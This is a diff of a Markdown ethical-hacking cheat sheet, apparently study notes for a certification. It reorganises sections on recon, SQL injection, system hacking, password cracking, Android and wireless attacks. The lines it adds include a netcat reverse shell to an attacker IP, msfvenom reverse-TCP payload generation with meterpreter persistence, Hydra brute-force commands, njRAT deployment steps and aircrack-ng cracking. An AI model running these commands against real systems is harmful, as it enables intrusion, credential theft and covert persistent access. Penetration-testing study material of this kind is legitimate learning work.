@@ -2,7 +2,7 @@
 
 [Ethical hacking git](https://github.com/LibyKurian/ethicalhacking-h.git)
 
-<details><summary><h4> ⏬ Recon </h4></summary>
+### <details><summary>__ ⏬ Recon __</summary>
   
   ##### via Web
   - [Tor Browser](https://www.torproject.org/download/)
@@ -22,7 +22,7 @@
   - Recon-ng
 </details>
 
-#### Network Scanning
+<h3>__Network Scanning__</h3>
 
 - [Central Ops .net](https://centralops.net/co/)
 - [OSINT framework](https://osintframework.com/)
@@ -80,7 +80,8 @@
 ---
 
 
-#### Enumeration
+<h3>__Enumeration__</h3>
+
 - SMB (port 445):
 ````bash
   #list shares:
@@ -155,7 +156,8 @@
   #-w = save to a file worlist
   ````
 
-#### Vulnerability scanning
+<h3>__Vulnerability scanning__</h3>
+
 - openVAS | greenbone ~ Install `apt install openvas -y` , Start `gvm-setup` / `gvm-start`
 - Tenable Nessus `systemctl start nessusd`
 - NIST
@@ -177,7 +179,9 @@
   ````
 </details>
 
-#### Stegnography
+
+<h3>__Stegnography__</h3>
+
 - steghide
     ````bash
     steghide extract -sf new.jpeg      #This will exctract the hidden file
@@ -220,7 +224,8 @@
       output.txt The file in which you want the output.
   ````
 
-#### Web explotation
+<h3>__Web explotation__</h3>
+
 ##### SQL Injection  
 
 <details><summary>Detect and Retrieving</summary>
@@ -385,16 +390,53 @@ If you have Meterpreter access:
 > > Use prepared statements: Avoid direct execution of user input.  
 </details>
 
-#### System Hacking
+<h3>__System Hacking__</h3>
+
 ##### Netcat Reverse Shell
-Attacker (Listener)
-  ```
-  nc -lvnp 4444
-  ```
-Victim (Windows/Linux)
-  ```
-  nc -e /bin/bash <ATTACKER-IP> 4444
-  ```
+Attacker (Listener) `nc -lvnp 4444`  
+Victim (Windows/Linux) `nc -e /bin/bash <ATTACKER-IP> 4444`
+
+<details><summary><h5>Hydra</h5></summary>
+
+  ````
+  hydra -L user.txt -P pass.txt smb://10.10.10.4
+  L =  logging file name
+  P = Passwords file name
+  hydra -t4 -l lin -P /usr/share/wordlists/rockyou.txt ssh:10.10.149.11
+
+hydra -l username -P passlist.txt 192.168.0.100 ssh            #SSH
+hydra -L userlist.txt -P passlist.txt ftp://192.168.0.100            #FTP
+
+#If the service isn't running on the default port, use -s
+hydra -L userlist.txt -P passlist.txt ftp://192.168.0.100 -s 221
+
+hydra -l admin -P passlist.txt -o test.txt 192.168.0.7 telnet      #TELNET
+
+# Login form
+sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=admin&password=^PASS^:Invalid Password!"  
+  ````
+</details>
+<details><summary><h5>RATs</h5></summary>
+
+  Identify Hidden Running Services:  
+    `Get-Service | Where-Object {$_.Status -eq "Running"}`    #Windows  
+    `ps aux | grep -i "nc\|meterpreter\|rat" `               # Linux  
+  Gaining access via meterpreter then:  
+  ````
+    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER-IP> LPORT=4444 -f exe > rat.exe
+    msfconsole
+     ~ use exploit/multi/handler
+     ~ meterpreter > sysinfo   #or getuid   #user privilege or hashdump  #Extract password hashes
+     ~ meterpreter > persistence -U -i 5 -p 4444 -r <ATTACKER-IP>  # Maintain access
+  ````
+  Applications like njRAT, DarkComet, QuasarRAT  
+  - Download and install njRAT (file from github blackall9) 
+  -	Start njRAT application with default port number and Build then enter attacker IP
+  -	Check required checkbox’s on right
+  -	Have that Executed on victim machine
+  -	Attacker will get the session active in njRAT console
+
+</details>
 
 ##### Theef
   > Server exe need to be run on victim and client exe on Attacker
@@ -407,7 +449,7 @@ Victim (Windows/Linux)
   
  > swazycrypter encryptes the application with more complexity/hash to avoid antivirus to find it.
 
-#### Cryptography
+<h3>__Cryptography__</h3>
 
 > Symmetric Encryption: Use same key for Encryption and decryption  
 > Asymmetric Encryption: Use Public/Private for Encryption and Decryption
@@ -424,7 +466,7 @@ Victim (Windows/Linux)
   #with john
     zip2john <zipfile.zip> > hash.txt        #First, extract the ZIP hash
     john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt        #Then, crack it using rockyou.txt
-    hashcat -m 13600 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --force        #OR use hashcat (mode 13600 for ZIP)
+    hashcat -m 13600 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --force       #mode 13600 → ZIP, 13721 → SHA-512 + XTS
     john --show hash.txt      #To see the cracked password
   #If the ZIP uses weak encryption (pkzip format), you might be able to extract files without a password:
     unzip -P "" <zipfile.zip>
@@ -505,7 +547,7 @@ To decrypt (crack) a hashed password:
     - Now agin start the veracrypt application and select the output file and we can attach/mount it as a 'New Volumn'.
 </details>
 
-##### Android Hacking
+<h3>__Android Hacking__</h3>
 
 <details><summary><b>A</b>ndroid <b>D</b>ebug <b>B</b>ridge</summary> We need this application here, and android victim must be in debug-mode
   
@@ -518,32 +560,17 @@ To decrypt (crack) a hashed password:
   $cd /path     //find folder
   $adb pull sdcard/test.txt /home/userr/Desktop
 ````
+<h3>__Wireless Hacking__</h3>
+
+````bash
+aircrack-ng Credmapwifi.cap     #get SSID 
+aircrack-ng -w /usr/share/wordlists/rockyou.txt -b <BSSID> Credmapwifi.cap        #crack
+
 
 With Phonesploit
 - Download and install this application from github
 - python3 phonesploit.py
 - use options to view/connect/download accordingly
-</details>
-
-<details><summary><h4>Hydra</h4></summary>
-
-  ````
-  hydra -L user.txt -P pass.txt smb://10.10.10.4
-  L =  logging file name
-  P = Passwords file name
-  hydra -t4 -l lin -P /usr/share/wordlists/rockyou.txt ssh:10.10.149.11
-
-hydra -l username -P passlist.txt 192.168.0.100 ssh            #SSH
-hydra -L userlist.txt -P passlist.txt ftp://192.168.0.100            #FTP
-
-#If the service isn't running on the default port, use -s
-hydra -L userlist.txt -P passlist.txt ftp://192.168.0.100 -s 221
-
-hydra -l admin -P passlist.txt -o test.txt 192.168.0.7 telnet      #TELNET
-
-# Login form
-sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=admin&password=^PASS^:Invalid Password!"  
-  ````
 </details>
 
 #### More
